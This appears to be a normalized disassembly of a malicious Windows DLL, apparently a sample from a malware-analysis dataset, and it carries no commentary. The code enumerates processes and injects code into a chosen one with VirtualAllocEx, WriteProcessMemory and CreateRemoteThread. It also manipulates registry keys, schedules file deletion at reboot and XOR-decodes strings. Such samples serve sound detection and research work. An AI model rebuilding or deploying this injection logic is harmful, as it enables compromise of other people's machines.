test eax eax
jne r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call edi
push [ ebp - 0x110 ]
lea eax [ ebp - 0x104 ]
push eax
call esi
add esp 0x10
lea eax [ ebp - 0x104 ]
push eax
push ebx
call [ SHDeleteKeyA@IAT ]
mov ecx [ ebp - 0x108 ]
shr ecx 0x1
je r-xdata
push [ ebp - 0x108 ]
lea eax [ ebp - 0x104 ]
push eax
push 0x2
push 0x0
push r--data
push [ ebp - 0x10c ]
call [ RegSetValueExW@IAT ]
jmp r-xdata
xor [ ebp + eax * 2 - 0x104 ] 0x7c
inc eax
cmp eax ecx
jb r-xdata
DllUnregisterServer
push ebp
mov ebp esp
sub esp 0x1c
push esi
push edi
call [ GetTickCount@IAT ]
push eax
call [ srand@IAT ]
pop ecx
call sub_10012ca6
mov esi [ GetMessageA@IAT ]
xor edi edi
push edi
push edi
push edi
lea eax [ ebp - 0x1c ]
push eax
call esi
test eax eax
jne r-xdata
push edi
call [ ExitProcess@IAT ]
DllRegisterServer
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x90
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8c ] eax
push esi
push edi
call [ GetTickCount@IAT ]
push eax
call [ srand@IAT ]
pop ecx
call sub_10007acc
test al al
jne r-xdata
push 0x4
push 0x0
push rw-data
call [ MoveFileExW@IAT ]
mov edi rw-data
push edi
call sub_10011e65
pop ecx
test al al
je r-xdata
call sub_1000711a
and eax 0xffff0000
cmp eax 0x6010000
jne r-xdata
mov ecx edi
call sub_10011f52
test al al
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ esp + 0x94 ]
pop edi
pop esi
xor ecx esp
xor eax eax
call sub_10014571
mov esp ebp
pop ebp
retn
call sub_10014154
jmp r-xdata
push rw-data
call sub_10012d07
pop ecx
call [ rand@IAT ]
cdq
mov ecx 0x3e7
idiv ecx
mov esi [ strlen@IAT ]
push edx
push r--data
push edi
call esi
pop ecx
push 0x40
pop ecx
sub ecx eax
push ecx
push edi
call esi
pop ecx
add eax edi
push eax
call [ _snprintf@IAT ]
add esp 0x10
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x14 ] 0x80
call [ GetComputerNameA@IAT ]
call [ rand@IAT ]
cdq
mov ecx 0x3e7
idiv ecx
lea eax [ esp + 0x10 ]
push edx
push eax
push r--data
push 0x40
push edi
call [ _snprintf@IAT ]
add esp 0x14
jmp r-xdata
call sub_10012022
push r--data
push rw-data
call [ strcpy@IAT ]
pop ecx
pop ecx
cmp [ rw-data ] 0x0
jne r-xdata
sub_100134e1
mov ecx rw-data
call sub_10011f52
test al al
je r-xdata
xor eax eax
retn
mov ecx rw-data
call sub_1001324d
push 0x4
push 0x0
push rw-data
call [ MoveFileExW@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push esi
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
push 0x0
mov esi eax
call [ GetCurrentProcess@IAT ]
push eax
call esi
pop esi
sub_1001353a
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov esi [ ebp + 0x8 ]
add eax esi
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] eax
add esi 0x4
mov [ ecx ] esi
mov esi edx
mov edx esi
sub edx ebx
mov [ ebp - 0x8 ] edx
dec edx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] edx
cmp edx 0xbffe
ja r-xdata
movzx ecx [ esi + 0x2 ]
lea eax [ esi + 0x3 ]
mov [ ebp - 0x1c ] eax
mov al [ eax ]
movzx eax al
shl eax 0x6
xor eax ecx
shl eax 0x5
lea edx [ esi + 0x1 ]
movzx ecx [ edx ]
xor eax ecx
movzx ecx [ esi ]
shl eax 0x5
xor eax ecx
mov ecx [ ebp + 0x14 ]
imul eax eax 0x21
shr eax 0x5
and eax 0x3fff
lea ecx [ ecx + eax * 4 ]
mov ebx [ ecx ]
mov [ ebp - 0x20 ] edx
cmp ebx [ ebp + 0x8 ]
jb r-xdata
sub edi [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ebp - 0x20 ]
cmp [ ebp - 0x8 ] 0x800
jbe r-xdata
mov ax [ ebx ]
cmp ax [ esi ]
jne r-xdata
mov edx [ ebp - 0x1c ]
mov dl [ edx ]
mov [ ebp - 0x1 ] dl
cmp [ ebx + 0x3 ] dl
je r-xdata
mov al [ esi + 0x2 ]
cmp [ ebx + 0x2 ] al
jne r-xdata
mov ecx [ ebp + 0x14 ]
and eax 0x7ff
xor eax 0x201f
lea ecx [ ecx + eax * 4 ]
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] esi
sub esi [ ebp - 0xc ]
je r-xdata
mov eax esi
sub eax ebx
lea edx [ eax - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] edx
cmp edx 0xbffe
ja r-xdata
mov esi [ ebp - 0x1c ]
mov al [ esi ]
inc esi
cmp [ ebx + 0x3 ] al
jne r-xdata
mov edx esi
mov [ ebp - 0x20 ] edx
cmp edx 0x3
ja r-xdata
cmp eax 0x800
jbe r-xdata
dec esi
mov eax esi
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x8 ] 0x800
ja r-xdata
mov al [ esi ]
inc esi
cmp [ ebx + 0x4 ] al
jne r-xdata
cmp edx 0x12
ja r-xdata
or [ edi - 0x2 ] dl
jmp r-xdata
mov al [ ebp - 0x1 ]
cmp [ ebx + 0x3 ] al
jne r-xdata
mov ecx 0x4000
sub al 0x2
cmp [ ebp - 0x8 ] ecx
ja r-xdata
mov ecx [ ebp - 0x14 ]
dec al
mov dl cl
shl al 0x3
and dl 0x7
or al dl
shl al 0x2
shr ecx 0x3
mov [ edi ] al
mov [ edi + 0x1 ] cl
jmp r-xdata
mov al [ esi ]
inc esi
cmp [ ebx + 0x5 ] al
jne r-xdata
lea eax [ edx - 0x12 ]
mov [ edi ] 0x0
mov ecx 0xff
inc edi
mov [ ebp - 0x18 ] eax
cmp eax ecx
jbe r-xdata
lea eax [ edx - 0x3 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
mov al [ eax ]
mov [ edi ] al
inc edi
inc [ ebp - 0xc ]
dec edx
jne r-xdata
sub [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
shr ecx 0xb
and cl 0x8
or cl al
or cl 0x10
mov [ edi ] cl
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x8 ] ecx
or al 0x20
jmp r-xdata
add edi 0x2
mov [ ebp - 0xc ] esi
jmp r-xdata
mov al [ esi ]
inc esi
cmp [ ebx + 0x6 ] al
jne r-xdata
mov [ edi ] al
inc edi
add eax 0xffffff00
xor edx edx
div ecx
lea esi [ eax + 0x1 ]
push esi
push 0x0
push edi
call memset
add esp 0xc
add edi esi
mov eax [ ebp - 0x10 ]
add eax 0xfffffff3
cmp esi eax
jb r-xdata
mov [ edi ] al
jmp r-xdata
mov al [ esi ]
inc esi
cmp [ ebx + 0x7 ] al
jne r-xdata
sub [ ebp - 0x18 ] 0xff
dec esi
jne r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov cl al
inc edi
shl cl 0x2
shr eax 0x6
mov [ edi ] cl
mov [ edi + 0x1 ] al
mov al [ esi ]
inc esi
cmp [ ebx + 0x8 ] al
jne r-xdata
add ebx 0x9
jmp r-xdata
cmp esi [ ebp - 0x10 ]
jb r-xdata
mov al [ ebx ]
cmp al [ esi ]
jne r-xdata
mov ebx esi
sub ebx [ ebp - 0xc ]
mov eax 0x4000
cmp [ ebp - 0x8 ] eax
ja r-xdata
inc ebx
inc esi
sub [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
shr eax 0xb
and al 0x8
cmp ebx 0x9
ja r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
cmp ebx 0x21
ja r-xdata
sub ebx 0x9
or al 0x10
mov [ edi ] al
sub bl 0x2
or al bl
or al 0x10
sub ebx 0x21
mov [ edi ] 0x20
jmp r-xdata
sub bl 0x2
or bl 0x20
mov [ edi ] bl
jmp r-xdata
xor edx edx
mov ecx 0xff
lea eax [ ebx - 0x100 ]
div ecx
inc eax
push eax
push 0x0
push edi
mov [ ebp - 0x18 ] eax
call memset
add esp 0xc
add edi [ ebp - 0x18 ]
inc edi
cmp ebx 0xff
jbe r-xdata
sub ebx 0xff
dec [ ebp - 0x18 ]
jne r-xdata
jmp r-xdata
sub_10013818
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx eax
push edi
mov edi ecx
cmp ebx 0xd
ja r-xdata
push [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
push edi
call sub_1001353a
mov esi [ esi ]
add esp 0x10
add esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx eax
mov ecx ebx
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ esi ] 0x11
add esi 0x2
mov [ esi ] 0x0
sub esi [ ebp + 0x8 ]
pop edi
inc esi
mov [ eax ] esi
pop esi
xor eax eax
pop ebx
leave
retn
sub edi ecx
add edi ebx
mov [ ebp - 0xc ] edi
cmp esi [ ebp + 0x8 ]
jne r-xdata
test ecx ecx
je r-xdata
cmp ecx 0x3
ja r-xdata
cmp ecx 0xee
ja r-xdata
cmp ecx 0x12
ja r-xdata
or [ esi - 0x2 ] cl
jmp r-xdata
lea eax [ ecx + 0x11 ]
jmp r-xdata
lea eax [ ecx - 0x12 ]
mov [ esi ] 0x0
mov ebx 0xff
inc esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jbe r-xdata
lea eax [ ecx - 0x3 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ esi ] al
inc esi
add eax 0xffffff00
xor edx edx
mov ecx ebx
div ecx
lea edi [ eax + 0x1 ]
push edi
push 0x0
push esi
call memset
add esp 0xc
add esi edi
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
dec ecx
jne r-xdata
sub [ ebp - 0x8 ] ebx
dec edi
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
sub_100138e7
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov dl [ esi ]
add eax esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
and [ eax ] 0x0
mov eax [ ebp + 0x8 ]
push edi
push 0x4
pop ebx
cmp dl 0x11
jbe r-xdata
movzx esi [ ecx ]
inc ecx
cmp esi 0x10
jae r-xdata
movzx edi dl
sub edi 0x11
lea ecx [ esi + 0x1 ]
cmp edi ebx
jb r-xdata
cmp esi 0x40
jb r-xdata
test esi esi
jne r-xdata
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
cmp edi 0x1
jbe r-xdata
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
dec edi
jne r-xdata
cmp esi 0x20
jb r-xdata
mov edx esi
shr edx 0x2
and edx 0x7
mov edi eax
sub edi edx
movzx edx [ ecx ]
shl edx 0x3
sub edi edx
dec edi
shr esi 0x5
inc ecx
dec esi
mov edx [ ecx ]
mov [ eax ] edx
add eax ebx
add ecx ebx
dec esi
je r-xdata
jmp r-xdata
movzx esi [ ecx ]
inc ecx
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
cmp edi 0x2
jbe r-xdata
jmp r-xdata
mov edi eax
cmp esi 0x10
jb r-xdata
and esi 0x1f
jne r-xdata
mov dl [ edi ]
mov [ eax ] dl
inc eax
inc edi
dec esi
jne r-xdata
jmp r-xdata
movzx esi [ ecx ]
inc ecx
cmp esi 0x10
jae r-xdata
cmp esi ebx
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
movzx edx [ ecx ]
shr esi 0x2
shl edx 0x2
sub edi esi
sub edi edx
mov dl [ edi - 0x1 ]
mov [ eax ] dl
mov dl [ edi ]
inc ecx
mov [ eax + 0x1 ] dl
add eax 0x2
jmp r-xdata
mov edx esi
and edx 0x8
shl edx 0xb
sub edi edx
and esi 0x7
jne r-xdata
movzx edx [ ecx ]
shr edx 0x2
mov edi eax
sub edi edx
dec edi
add ecx 0x2
jmp r-xdata
jmp r-xdata
movzx edi [ ecx - 0x2 ]
and edi 0x3
je r-xdata
movzx edx [ ecx ]
shl edx 0x2
shr esi 0x2
mov edi eax
sub edi esi
sub edi edx
mov dl [ edi - 0x801 ]
mov [ eax ] dl
mov dl [ edi - 0x800 ]
mov [ eax + 0x1 ] dl
mov dl [ edi - 0x7ff ]
inc ecx
mov [ eax + 0x2 ] dl
add eax 0x3
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
dec esi
jne r-xdata
mov edx [ ecx ]
mov [ eax ] edx
sub esi ebx
add eax ebx
add ecx ebx
cmp esi ebx
jae r-xdata
add esi 0xff
inc ecx
movzx edx [ ecx ]
lea esi [ esi + edx + 0xf ]
inc ecx
movzx edx [ ecx ]
shr edx 0x2
sub edi edx
add ecx 0x2
cmp edi eax
je r-xdata
jmp r-xdata
cmp esi 0x6
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
test esi esi
je r-xdata
sub eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax ecx
sub eax [ ebp - 0x4 ]
cmp ecx [ ebp - 0x4 ]
pop edi
sbb ecx ecx
and ecx 0xfffffffc
add ecx 0xfffffffc
neg eax
sbb eax eax
pop esi
and eax ecx
pop ebx
leave
retn
sub edi 0x4000
cmp [ ecx ] 0x0
je r-xdata
mov dl [ edi ]
mov [ eax ] dl
mov dl [ edi + 0x1 ]
mov [ eax + 0x1 ] dl
add eax 0x2
add edi 0x2
mov edx eax
sub edx edi
cmp edx ebx
jl r-xdata
add esi 0xff
inc ecx
movzx edx [ ecx ]
lea esi [ esi + edx + 0x1f ]
inc ecx
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
dec esi
jne r-xdata
add esi 0xff
inc ecx
movzx edx [ ecx ]
lea esi [ esi + edx + 0x7 ]
inc ecx
mov edx [ edi ]
mov [ eax ] edx
add eax ebx
add edi ebx
sub esi 0x2
jmp r-xdata
mov edx [ edi ]
mov [ eax ] edx
sub esi ebx
add eax ebx
add edi ebx
cmp esi ebx
jae r-xdata
test esi esi
je r-xdata
mov dl [ edi ]
mov [ eax ] dl
inc eax
inc edi
dec esi
jne r-xdata
jmp r-xdata
sub_10013b15
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax 0x0
je r-xdata
call sub_10012cc0
mov eax [ rw-data ]
test eax eax
je r-xdata
dec eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn 0xc
push eax
call [ FreeLibrary@IAT ]
push esi
mov esi [ ebp + 0x8 ]
push esi
call [ DisableThreadLibraryCalls@IAT ]
call [ GetTickCount@IAT ]
push eax
call [ srand@IAT ]
mov [ esp ] 0x104
push rw-data
push esi
mov [ rw-data ] esi
call [ GetModuleFileNameW@IAT ]
call sub_10014265
pop esi
jmp r-xdata
sub_10013b78
push ebp
mov ebp esp
sub esp 0x84
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0xcc8 ]
push eax
call [ esi + 0x4 ]
mov ebx eax
lea eax [ esi + 0xc88 ]
push eax
mov [ ebp - 0x18 ] ebx
call [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push [ ebp - 0x14 ]
call [ esi ]
push edi
lea eax [ esi + 0xd08 ]
push eax
push ebx
call [ esi + 0x8 ]
mov edi eax
lea eax [ esi + 0xd28 ]
push eax
push ebx
call [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
lea eax [ esi + 0xd48 ]
push eax
push ebx
call [ esi + 0x8 ]
mov ebx eax
lea eax [ esi + 0xd68 ]
push eax
push [ ebp - 0x18 ]
call [ esi + 0x8 ]
mov [ ebp - 0x1c ] eax
lea eax [ esi + 0xd88 ]
push eax
push [ ebp - 0x14 ]
call [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ esi + 0xda8 ]
push eax
push [ ebp - 0x14 ]
call [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
test edi edi
je r-xdata
push 0x0
call [ esi + 0x14 ]
pop esi
xor eax eax
pop ebx
leave
retn 0x4
push [ ebp - 0x18 ]
call [ esi ]
pop edi
cmp [ ebp - 0x20 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test eax eax
je r-xdata
push 0x0
call edi
test eax eax
jne r-xdata
push 0x23
pop eax
dec eax
mov [ ebp + eax - 0x83 ] 0x0
jns r-xdata
xor edi edi
lea eax [ esi + 0xa40 ]
mov [ ebp - 0x84 ] 0x24
mov [ ebp - 0x70 ] 0x4
mov [ ebp + 0x8 ] edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] edi
cmp [ eax ] di
je r-xdata
lea eax [ esi + 0xc48 ]
cmp [ eax ] edi
je r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ esi + 0xc58 ]
push ecx
lea ecx [ ebp - 0x84 ]
push ecx
push eax
call ebx
test eax eax
je r-xdata
call [ ebp - 0x20 ]
cmp [ esi + 0xc4c ] di
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax edi
je r-xdata
cmp [ esi + 0xc4e ] di
je r-xdata
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push 0x10840014
push eax
call [ ecx + 0x14 ]
test eax eax
jne r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ esi + 0xc58 ]
push ecx
push 0x7
push edi
push eax
call [ ebp - 0x1c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
lea ebx [ esi + 0xc68 ]
push ebx
push 0x0
lea eax [ esi + 0x18 ]
push eax
call [ ebp - 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp [ ebp - 0xc ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
push ebx
push 0x0
lea edi [ esi + 0x220 ]
push edi
call [ ebp - 0x8 ]
test eax eax
jne r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp [ ebp - 0x4 ] eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push 0x0
lea edx [ esi + 0x428 ]
push edx
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
push eax
call [ ecx + 0x40 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x54 ]
test eax eax
jne r-xdata
push 0x3b
pop eax
dec eax
mov [ ebp + eax - 0x5f ] 0x0
jns r-xdata
lea eax [ esi + 0x838 ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov [ ebp - 0x60 ] 0x3c
mov [ ebp - 0x5c ] 0x40
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x44 ] 0x5
call [ ebp - 0x24 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
xor edi edi
push edi
lea eax [ esi + 0x630 ]
push eax
call [ ebp - 0x8 ]
test eax eax
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
push 0xffffffff
push [ ebp - 0x28 ]
call [ esi + 0x10 ]
push [ ebp - 0x28 ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push edi
push [ ebp - 0x10 ]
push eax
call [ ecx + 0x48 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x54 ]
sub_10013e52
push ebp
mov ebp esp
sub esp 0x10
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi [ GetModuleHandleA@IAT ]
push edi
push r--data
push r--data
call esi
mov edi [ GetProcAddress@IAT ]
push eax
call edi
mov ebx eax
test ebx ebx
je r-xdata
push r--data
push r--data
call esi
push eax
call edi
and [ ebp - 0x8 ] 0x0
mov edi r--data
push edi
call [ strlen@IAT ]
pop ecx
mov [ ebp - 0xe ] ax
mov [ ebp - 0x10 ] ax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push r--data
mov [ ebp - 0xc ] edi
call esi
push eax
call ebx
test eax eax
js r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] eax
sub_10013ed3
push ebp
mov ebp esp
push ecx
push ebx
push esi
push [ ebp + 0x10 ]
xor ebx ebx
push 0x1000
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
push ebx
push edi
call [ VirtualAllocEx@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
leave
retn
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
push edi
call [ WriteProcessMemory@IAT ]
test eax eax
je r-xdata
push 0x8000
push ebx
push esi
push edi
call [ VirtualFreeEx@IAT ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push edi
call [ VirtualProtectEx@IAT ]
mov [ ebp - 0x4 ] esi
jmp r-xdata
sub_10013f33
push ebp
mov ebp esp
sub esp 0xfe0
and [ ebp - 0x8 ] 0x0
push ebx
push esi
push edi
push 0x104
lea eax [ ebp - 0xfdc ]
push eax
call [ GetWindowsDirectoryW@IAT ]
call sub_10013e52
mov esi [ GetModuleHandleA@IAT ]
push r--data
mov ebx r--data
push ebx
mov [ ebp - 0xdcc ] eax
call esi
mov edi [ GetProcAddress@IAT ]
push eax
call edi
push r--data
push ebx
mov [ ebp - 0xdd4 ] eax
call esi
push eax
call edi
push r--data
push ebx
mov [ ebp - 0xdd0 ] eax
call esi
push eax
call edi
push r--data
push ebx
mov [ ebp - 0xdc8 ] eax
call esi
push eax
call edi
push r--data
push ebx
mov [ ebp - 0xdc4 ] eax
call esi
push eax
call edi
mov esi [ wcscpy@IAT ]
mov [ ebp - 0xdc0 ] eax
lea eax [ ebp - 0xdbc ]
push rw-data
push eax
call esi
lea eax [ ebp - 0xbb4 ]
push r--data
push eax
call esi
lea eax [ ebp - 0x9ac ]
push r--data
push eax
call esi
lea eax [ ebp - 0x7a4 ]
push r--data
push eax
call esi
lea eax [ ebp - 0x59c ]
push r--data
push eax
call esi
mov ax [ ebp - 0xfdc ]
mov [ ebp - 0xbb4 ] ax
mov [ ebp - 0x7a4 ] ax
mov [ ebp - 0x59c ] ax
lea eax [ ebp - 0x14c ]
push r--data
push eax
call esi
lea eax [ ebp - 0x10c ]
push r--data
push eax
call esi
mov edi [ strcpy@IAT ]
lea eax [ ebp - 0xcc ]
push r--data
push eax
call edi
add esp 0x40
lea eax [ ebp - 0xac ]
push r--data
push eax
call edi
lea eax [ ebp - 0x8c ]
push r--data
push eax
call edi
lea eax [ ebp - 0x6c ]
push r--data
push eax
call edi
lea eax [ ebp - 0x4c ]
push r--data
push eax
call edi
lea eax [ ebp - 0x2c ]
push r--data
push eax
call edi
lea eax [ ebp - 0x394 ]
push r--data
push eax
call esi
mov esi r--data
lea edi [ ebp - 0x18c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi r--data
lea edi [ ebp - 0x17c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi r--data
lea edi [ ebp - 0x16c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi r--data
lea edi [ ebp - 0x15c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x4
lea eax [ ebp - 0xdd4 ]
movsd [ edi ] [ esi ]
mov edi [ ebp + 0x8 ]
push 0xdc8
push eax
call sub_10013ed3
mov esi eax
mov eax sub_10013b78
mov ecx sub_10013e51
push 0x20
sub ecx eax
push ecx
push eax
call sub_10013ed3
xor ebx ebx
add esp 0x48
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
cmp eax ebx
je r-xdata
push ebx
push ebx
push esi
push eax
push ebx
push ebx
push edi
call [ CreateRemoteThread@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0xffffffff
push esi
call [ WaitForSingleObject@IAT ]
push esi
call [ CloseHandle@IAT ]
mov [ ebp - 0x8 ] 0x1
sub_10014154
push ebp
mov ebp esp
mov eax 0x411c
call sub_10014ee0
push ebx
push esi
push edi
lea eax [ ebp - 0xc ]
push eax
push 0x4000
lea eax [ ebp - 0x4118 ]
push eax
call [ EnumProcesses@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov esi [ ebp - 0xc ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
shr esi 0x2
test esi esi
je r-xdata
mov ebx [ _stricmp@IAT ]
mov eax [ ebp - 0x4 ]
mov eax [ ebp + eax * 4 - 0x4118 ]
test eax eax
je r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jb r-xdata
push eax
push 0x0
push 0x1fffff
call [ OpenProcess@IAT ]
mov edi eax
test edi edi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x104
lea eax [ ebp - 0x118 ]
push eax
push 0x0
push edi
call [ GetModuleBaseNameA@IAT ]
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x118 ]
push r--data
push eax
call ebx
pop ecx
pop ecx
test eax eax
je r-xdata
push edi
call sub_10013f33
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x118 ]
push r--data
push eax
call ebx
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
lea eax [ ebp - 0x118 ]
push r--data
push eax
call ebx
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x118 ]
push r--data
push eax
call ebx
pop ecx
pop ecx
test eax eax
jne r-xdata
sub_10014265
push ebp
mov ebp esp
sub esp 0x410
push esi
push edi
mov esi 0x104
push esi
lea eax [ ebp - 0x208 ]
push eax
call [ GetSystemDirectoryW@IAT ]
mov edi [ wcslen@IAT ]
lea eax [ ebp - 0x208 ]
push eax
call edi
cmp [ ebp + eax * 2 - 0x20a ] 0x5c
pop ecx
jne r-xdata
lea eax [ ebp - 0x208 ]
push r--data
push eax
call [ wcscat@IAT ]
pop ecx
pop ecx
push esi
lea eax [ ebp - 0x410 ]
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
lea eax [ ebp - 0x410 ]
push eax
lea eax [ ebp - 0x208 ]
push eax
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x208 ]
push eax
call edi
pop ecx
xor ecx ecx
mov [ ebp + eax * 2 - 0x20a ] cx
pop edi
pop esi
leave
retn
call sub_10007acc
test al al
je r-xdata
push 0x0
call [ ExitProcess@IAT ]
push rw-data
push r--data
lea eax [ ebp - 0x410 ]
push esi
push eax
call [ _snwprintf@IAT ]
lea eax [ ebp - 0x410 ]
push eax
call sub_10007992
add esp 0x14
sub_10014342
push ebp
mov ebp esp
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x5
and edx 0x1f
emms
sfence
and edx 0x4
jne r-xdata
prefetchnta [ edi + 0x200 ]
prefetchnta [ esi + 0x200 ]
movq mmx0 [ edi ]
movq mmx1 [ edi + 0x8 ]
movq mm2 [ edi + 0x10 ]
movq mm3 [ edi + 0x18 ]
movq mm4 [ esi ]
movq mm5 [ esi + 0x8 ]
movq mm6 [ esi + 0x10 ]
movq mm7 [ esi + 0x18 ]
pxor mmx0 mm4
pxor mmx1 mm5
pxor mm2 mm6
pxor mm3 mm7
movntq [ edi ] mmx0
movntq [ edi + 0x8 ] mmx1
movntq [ edi + 0x10 ] mm2
movntq [ edi + 0x18 ] mm3
dec ecx
lea edi [ edi + 0x20 ]
lea edi [ esi + 0x20 ]
jmp r-xdata
and edx 0x2
jne r-xdata
mov eax [ esi ]
xor [ edi ] eax
lea edi [ edi + 0x4 ]
lea edi [ esi + 0x4 ]
jecxz r-xdata
and edx 0x1
jne r-xdata
mov ax [ esi ]
xor [ edi ] ax
